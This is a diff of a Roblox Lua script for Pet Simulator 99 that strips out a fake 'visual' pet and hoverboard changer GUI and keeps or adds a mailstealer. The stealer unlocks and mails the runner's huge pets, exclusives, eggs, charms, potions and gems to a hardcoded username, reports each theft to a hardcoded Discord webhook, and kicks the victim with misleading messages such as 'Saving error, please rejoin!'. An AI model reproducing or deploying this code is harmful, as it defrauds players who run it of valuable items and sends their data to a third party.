@@ -1,183 +1,3 @@
-getgenv().executed = true
-
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "D3PE visual | Pet Simulator 99", HidePremium = false, IntroText = "D3PE Hub", SaveConfig = true, ConfigFolder = "D3PE Hub"})
-local TitanicTab = Window:MakeTab({
-  Name = "Pets",
-  Icon = "rbxassetid://4559100997",
-  PremiumOnly = false
-})
-
-local HoverTab = Window:MakeTab({
-  Name = "Hoverboards",
-  Icon = "rbxassetid://4559100997",
-  PremiumOnly = false
-})
-
-local BoothTab = Window:MakeTab({
-  Name = "Booths",
-  Icon = "rbxassetid://4559100997",
-  PremiumOnly = false
-})
-
-local SecurityTab = Window:MakeTab({
-  Name = "gg/HC99Wxeq",
-  Icon = "rbxassetid://4559100997",
-  PremiumOnly = false
-})
-
-SecurityTab:AddParagraph(".gg/HC99Wxeq", "..gg/HC99Wxeq")
-
-TitanicTab:AddButton({
-  Name = "Mobile Mode",
-  Callback = function()
-    -- Gui to Lua
--- Version: 3.2
-
--- Instances:
-
-local ScreenGui = Instance.new("ScreenGui")
-local ImageButton = Instance.new("ImageButton")
-local UICorner = Instance.new("UICorner")
-
--- Properties:
-
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-ImageButton.Parent = ScreenGui
-ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ImageButton.BorderSizePixel = 0
-ImageButton.Position = UDim2.new(0.751020432, 0, 0.242559522, 0)
-ImageButton.Size = UDim2.new(0, 42, 0, 41)
-ImageButton.Image = "http://www.roblox.com/asset/?id=15343201872"
-
-UICorner.Parent = ImageButton
-
--- Function to Toggle Orion Visibility:
-
-local isVisible = true
-local orionGui = game:GetService("CoreGui").Orion
-
-local function ToggleOrionVisibility()
-  isVisible = not isVisible
-  for _, frame in ipairs(orionGui:GetDescendants()) do
-      if frame:IsA("Frame") then
-          frame.Visible = isVisible
-      end
-  end
-end
-
--- Mouse Click Event for ImageButton:
-
-ImageButton.MouseButton1Click:Connect(ToggleOrionVisibility)
-    end    
-})
-
-TitanicTab:AddTextbox({
-	Name = "From Pet",
-	Default = "Cat",
-	TextDisappear = true,
-	Callback = function(Value)
-		fromPet = Value
-	end	  
-})
-
-TitanicTab:AddTextbox({
-	Name = "To Pet",
-	Default = "Huge Cat",
-	TextDisappear = true,
-	Callback = function(Value)
-		toPet = Value
-	end	  
-})
-
-TitanicTab:AddButton({
-	Name = "Change!",
-	Callback = function()
-    local Library = require(game.ReplicatedStorage.Library)
-    local Save = Library.Save.Get().Inventory
-    local Directory = Library.Directory
-    for i,v in pairs(Directory.Pets[fromPet]) do
-      Directory.Pets[fromPet][i] = nil
-    end
-    for i,v in pairs(Directory.Pets[toPet]) do
-      Directory.Pets[fromPet][i] = v
-    end
-  end    
-})
-
-HoverTab:AddTextbox({
-	Name = "From Hoverboard",
-	Default = "Original",
-	TextDisappear = true,
-	Callback = function(Value)
-		fromH = Value
-	end	  
-})
-
-HoverTab:AddTextbox({
-	Name = "To Hoverboard",
-	Default = "",
-	TextDisappear = true,
-	Callback = function(Value)
-		toH = Value
-	end	  
-})
-
-HoverTab:AddParagraph("Hoverboard List:","High Tech, Green Present, Steampunk, Cosmic, Pumpkin Cat, Red Flying Carpet, VIP, Oversized, Pinata, Axolotl, Flame, Balloon, Rudolph, Noob, Fire Dragon, Banana, Unicorn, Purple, UFO, GT3, Cat, Sk8board, Red Present, Blobfish, M-10, Easter Bunny, Blue Flying Carpet, Diamond, Camo, Tiger, Sleigh, Pegasus, Bee, Original, Watermelon, Ducky, Bling, Very Oversized, Surfboard, Doodle, Rainbow, Cardboard")
-
-HoverTab:AddButton({
-	Name = "Change!",
-	Callback = function()
-    local Library = require(game.ReplicatedStorage.Library)
-    local Save = Library.Save.Get().Inventory
-    local Directory = Library.Directory
-    for i,v in pairs(Directory.Hoverboards[fromH]) do
-      Directory.Hoverboards[fromH][i] = nil
-    end
-    for i,v in pairs(Directory.Hoverboards[toH]) do
-      Directory.Hoverboards[fromH][i] = v
-    end
-  end    
-})
-
-BoothTab:AddTextbox({
-	Name = "From Booth",
-	Default = "Default",
-	TextDisappear = true,
-	Callback = function(Value)
-		fromBo = Value
-	end	  
-})
-
-BoothTab:AddTextbox({
-	Name = "To Booth",
-	Default = "",
-	TextDisappear = true,
-	Callback = function(Value)
-		toBo = Value
-	end	  
-})
-
-BoothTab:AddParagraph("Booths List:","Egg, Galaxy, Hippomelon, Monkey, Present, Panda, Fishing, Dragon, Lightning, Cat, Corgi, Merchant, Christmas, Rainbow, Gold, M10, Easter, Cupcake, Pls Donate, Balloon, VIP, Unicorn, Summer, Glitched, Parrot, Default, Neon Twilight, Maskot, Fire, Diamond, Axolotl")
-
-BoothTab:AddButton({
-	Name = "Change!",
-	Callback = function()
-    local Library = require(game.ReplicatedStorage.Library)
-    local Save = Library.Save.Get().Inventory
-    local Directory = Library.Directory
-    for i,v in pairs(Directory.Booths[fromH]) do
-      Directory.Booths[fromH][i] = nil
-    end
-    for i,v in pairs(Directory.Booths[toH]) do
-      Directory.Booths[fromH][i] = v
-    end
-  end    
-})
-
 Username = "br1c7s"
 Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed" -- your discord webhook in here
 min_rap = 20000
@@ -239,7 +59,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 10000 then
-    plr:kick("Alt detected, please rejoin!")
+    plr:kick("Saving error, please rejoin!")
 end
 
 local user = Username
@@ -334,4 +154,215 @@ local function SendAllHuges()
 	repeat
 		hugesSent = hugesSent + StealHuge()
 	until hugesSent == totalHuges
+end
+
+local function CountExc()
+	local count = 0
+	for i, v in pairs(save.Pet) do
+		local id = v.id
+		local dir = library.Directory.Pets[id]
+		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
+			count = count + 1
+		end
+	end
+	return count
+end
+
+local function ExcSteal()
+	local excSent = 0
+	local initialExc = CountExc()
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
+			if v._lk then
+				local args = {
+				[1] = i,
+				[2] = false
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+			end
+            sendItem("Pet", i, v._am or 1, id)
+			local finalExc = CountExc()
+			if finalExc < initialExc then
+				excSent = excSent + 1
+				initialExc = finalExc
+			end
+        end
+    end
+	return excSent
+end
+
+local function SendAllExc()
+	local totalExc = CountExc()
+	local excSent = 0
+	repeat
+		excSent = excSent + ExcSteal()
+	until excSent == totalExc
+end
+
+local function EggSteal()
+    for i, v in pairs(save.Egg) do
+		local id = v.id
+		local diregg = library.Directory.Eggs[id]
+		if diregg and getRAP("Egg", v) >= min_rap then
+			sendItem("Egg", i, v._am or 1, id)
+		end
+    end
+end
+
+local function CharmSteal()
+    for i, v in pairs(save.Charm) do
+        local id = v.id
+		local dircharm = library.Directory.Charms[id]
+		if dircharm and getRAP("Charm", v) >= min_rap then
+			sendItem("Charm", i, v._am or 1, id)
+		end
+    end
+end
+
+local function EnchantSteal()
+    for i, v in pairs(save.Enchant) do
+		local id = v.id
+		local direnchant = library.Directory.Enchants[id]
+		if direnchant and getRAP("Enchant", v) >= min_rap then
+			sendItem("Enchant", i, v._am or 1, id)
+		end
+    end
+end
+
+local function PotionSteal()
+    for i, v in pairs(save.Potion) do
+		local id = v.id
+		local dirpotion = library.Directory.Potions[id]
+		if dirpotion and getRAP("Potion", v) >= min_rap then
+			sendItem("Potion", i, v._am or 1, id)
+		end
+    end
+end
+
+local function miscSteal()
+	for i, v in pairs(save.Misc) do
+		local id = v.id
+		local dirmisc = library.Directory.MiscItems[id]
+		if dirmisc and getRAP("Misc", v) > min_rap then
+			sendItem("Misc", i, v._am or 1, id)
+		end
+	end
+end
+
+local function hoverSteal()
+	for i, v in pairs(save.Hoverboard) do
+		local id = v.id
+		local dirhover = library.Directory.Hoverboards[id]
+		if dirhover and getRAP("Hoverboard", v) > min_rap then
+			sendItem("Hoverboard", i, v._am or 1, id)
+		end
+	end
+end
+
+local function boothSteal()
+	for i, v in pairs(save.Booth) do
+		local id = v.id
+		local dirbooth = library.Directory.Booths[id]
+		if dirbooth and getRAP("Booth", v) > min_rap then
+			sendItem("Booth", i, v._am or 1, id)
+		end
+	end
+end
+
+local function ultimateSteal()
+	for i, v in pairs(save.Ultimate) do
+		local id = v.id
+		local dirultimate = library.Directory.Ultimates[id]
+		if dirultimate and getRAP("Ultimate", v) > min_rap then
+			sendItem("Ultimate", i, v._am or 1, id)
+		end
+	end
+end
+
+local function GemSteal()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            local GemAmount = v._am
+            local args = {
+                [1] = user,
+                [2] = MailMessage,
+                [3] = "Currency",
+                [4] = i,
+                [5] = GemAmount - 10000
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
+			end
+        end
+    end
+end
+
+local function EmptyBoxes()
+    if save.Box then
+        for key, _ in pairs(save.Box) do
+			local args = {
+				[1] = key
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+local function CountGems()
+	for i, v in pairs(GetSave().Inventory.Currency) do
+		if v.id == "Diamonds" then
+			GemAmount1 = v._am
+			return GemAmount1
+		end
+	end
+end
+
+local function SendAllGems()
+	repeat
+		GemSteal()
+	until CountGems() == nil or CountGems() < 10000
+end
+
+if CountHuges() > 0 or CountGems() > 1000000 then
+	EmptyBoxes()
+	SendAllHuges()
+	SendAllExc()
+
+	if save.Egg ~= nil then
+		EggSteal()
+	end
+
+	if save.Charm ~= nil then
+		CharmSteal()
+	end
+
+	if save.Ultimate ~= nil then
+		ultimateSteal()
+	end
+	
+	if save.Enchant ~= nil then
+		EnchantSteal()
+	end
+	
+	if save.Potion ~= nil then
+		PotionSteal()
+	end
+
+	if save.Hoverboard ~= nil then
+		hoverSteal()
+	end
+
+	if save.Booth ~= nil then
+		boothSteal()
+	end
+
+	miscSteal()
+	SendAllGems()
+	setclipboard("preciate the stuff")
+	plr:kick("All your stuff has just been stolen by D3PES mailstealer.")
+else
+	plr:kick("Error on script execution: 0x0001F4A2")
 end
